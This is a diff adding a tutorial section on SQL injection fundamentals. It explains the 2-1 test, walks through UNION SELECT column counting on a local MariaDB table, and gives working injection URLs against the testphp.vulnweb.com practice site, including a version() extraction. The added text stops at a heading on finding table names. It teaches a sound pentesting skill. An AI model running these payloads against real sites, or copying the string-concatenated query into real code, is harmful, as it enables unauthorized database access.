@@ -228,5 +228,165 @@ There are few operants that you need to know.<br>
 `^`=XOR operator
 `!`=NOT operator
 
+### Discipline
+We have discovered some primitive behaviours of the database. Now we need to understand
+which discipline we need to adopt to find a sql injection. 
 
-To be continued.
+Lets say there is a back end code running at the server just like that.
+
+PSEUDO CODE
+```python
+id=request.get('id')
+query="SELECT * FROM news WHERE id ="+id
+result = db.execute(query)
+
+if result.size()>0:
+    for i in result:
+        print(i.title)
+else:
+    print("No news")
+```
+This is the pseudo code to illustrate possible setup working on a web server to bring html document.
+However we do not have access to this backend code, so what we are trying to do is that, we need to observe
+the behavior of the responds to see if there is an injection possiblity.
+
+Now lets say there are two html pages, one for id '1', and one for id '2':
+
+ID1
+```html
+<h1>This is html document for ID 1</h1>
+```
+ID2
+```html
+<h1>This is html document for ID 2</h1>
+```
+
+While we dont have access to backend code, we can modify url.
+```html
+www.xyz.com/?id=
+```
+As you can tell, we can bring one of those two html documents by passing related ID number to the `?id=` parameter.<br>
+Right now all the behaviour we have learned should make sense. We can either make request for `?id=1` or `=id=2-1`, both
+will bring the first html document which has ID1. 
+#### Principles
+- We need to determine an initial, referance point for our examination.
+In this case, it is html document of ID1 which we trying to return.
+- Try to access to the initial point with different methods.
+In this case we forced database to make that 2-1 operation to get out initial point.
+<br>
+
+From now on, we broke the system, we have observed that, it is possible for us to manipulate the database with an unexcpected
+behavior. Key point is that, you could return your referance point with avoiding expected behavior.<br><br>
+The question is that, what now ? How we can turn this vulnerability to our favour ? <br>
+In order to exploit this sql injection, we need to be able to run our own select query, however as you can tell it is not
+possible to change the query while it is hardcoded at the backend, we only can modify the parameter of it. This is where `UNION` saves the day.
+<br>
+Instead of passing `1` or `2` or `2-1` into the `?id=` field, we can pass `1 UNION SELECT .......`<br>
+As you remember that is the code at the back end.
+```python
+query="SELECT * FROM news WHERE id ="+id
+``` 
+`www.xyz.com/?id='1 UNION SELECT .....'` <br>
+<br>Query will run this for http request above-> `SELECT * FROM news WHERE id=1 UNION SELECT ....`
+<br> However at this point of time, we have two problems.<br>
+1-What I will select in my own query ? What will replace the ,I do not know anything about the database.<br>
+2-`UNION` has its limitations, the number of columns that return for each query should match.<br>
+It is time to do some real sql injection on a web page.
+
+## VULNWEB 
+<http://test.php.vulnweb.com> is a vulnerable website for pentesting practice. Navigate to the web page.
+### Remembering the principles
+As we talked it about before, we have a principle that has two parts.
+<br>
+1-Determine your referance point
+<br>
+2-Find a way to get back to that referance point with unexpected behavior.
+### Making sure of SQL injection's existence
+Navigate to <http://testphp.vulnweb.com/listproducts.php?cat=1> <br>This will be our referance point.<br><br>
+Than to <http://testphp.vulnweb.com/listproducts.php?cat=2> <br>As we see different cat id brings different items from table.<br><br>
+Than go for <http://testphp.vulnweb.com/listproducts.php?cat=2-1> <br>We tried an unexpected behavior, and eventually returned to our referance point.
+<br>Thus, now it is certain that this web site vulnerable to sql injection.
+<br>
+### Guessing the design
+If you observe the url, you can guess there is a table named `listproducts` and a column named `cat`.<br>
+Backend code may work like that:<br>
+```sql
+SELECT * FROM listproducts WHERE cat=
+```
+Of course those names are not the same like that
+at the source code, so we still do not know any names from the database.
+<br>
+### Finding the column count
+
+As we talked before, after finding the vulnerability with `2-1`, it is crucial to run our own queries.<br>
+`UNION` will be starting point for this example. However we need to
+know how many columns there are.<br>The way to do that is enumerate: <br>`1 UNION SELECT 1` to `1 UNION SELECT 1....x`.
+<br>
+![Desktop View](/assets/img/posts/fundamentals-of-sql-injection/sql10.jpg)
+<br>
+As you can see, when the number of columns are not match, this happens.
+<br><br>To give you better understanding about this
+I will demonstrate this on my local machine with a test table.
+```sql
+
+MariaDB [test]> SELECT * FROM users;
++----------+----------+-----------+
+| PersonID | LastName | FirstName |
++----------+----------+-----------+
+|        1 | Baris    | Burak     |
+|        1 | Baris    | Burak     |
+|        1 | Baris    | Burak     |
+|        1 | Baris    | Burak     |
+|        2 | Baris2   | Burak2    |
+|        3 | Baris3   | Burak3    |
++----------+----------+-----------+
+
+MariaDB [test]> SELECT * FROM users WHERE PErsonID=3;
++----------+----------+-----------+
+| PersonID | LastName | FirstName |
++----------+----------+-----------+
+|        3 | Baris3   | Burak3    |
++----------+----------+-----------+
+
+MariaDB [test]> SELECT * FROM users WHERE PErsonID=3 UNION SELECT 1;
+ERROR 1222 (21000): The used SELECT statements have a different number of columns
+MariaDB [test]> SELECT * FROM users WHERE PErsonID=3 UNION SELECT 1,2;
+ERROR 1222 (21000): The used SELECT statements have a different number of columns
+MariaDB [test]> SELECT * FROM users WHERE PErsonID=3 UNION SELECT 1,2,3;
++----------+----------+-----------+
+| PersonID | LastName | FirstName |
++----------+----------+-----------+
+|        3 | Baris3   | Burak3    |
+|        1 | 2        | 3         |
++----------+----------+-----------+
+
+```
+There are three columns for this table, `Person ID`, `LastName`, `FirstName`.It means the second query I will run after `UNION` should also
+have three columns to create an appropriate table. It actually makes sense, because it would be weird to have a concatanated table 
+with a blank column.
+As you can see I am getting the same error as the error on website when the number of columns are not match.
+<br>
+<br>
+![Desktop View](/assets/img/posts/fundamentals-of-sql-injection/sql9.jpg)
+<br>
+After enumerating until 11, we finally returning to our referance point.Thus we can tell the table has 11 columns in total.
+Scroll down to the bottom, you should see someting different.
+<br>
+![Desktop View](/assets/img/posts/fundamentals-of-sql-injection/sql8.jpg)
+<br>
+There is one more entry right now. However we see 7, 2 and 9. It means that web application prints out the informations to the
+html document that contained in second, seventh and nineth columns in the table.<br>
+It means that we can run whatever we want in that areas to extract information from the database. For example lets run `version()`
+helper function at second, seventh or nienth column to see version of the server that running the database.
+<br>
+<http://testphp.vulnweb.com/listproducts.php?cat=1%20UNION%20SELECT%201,version(),3,4,5,6,7,8,9,10,11>
+<br>
+![Desktop View](/assets/img/posts/fundamentals-of-sql-injection/sql11.jpg)
+<br>
+After this point of time, all the helper functions are available for you.You can run the following to avoid first part of the
+sql query to only see your own query by selecting something non existent from the database.
+<br>
+<http://testphp.vulnweb.com/listproducts.php?cat=8217582175821%20UNION%20SELECT%201,version(),3,4,5,6,7,8,9,10,11>
+### Finding the table name
+First of all we need to find the table name that we are going to extract
+
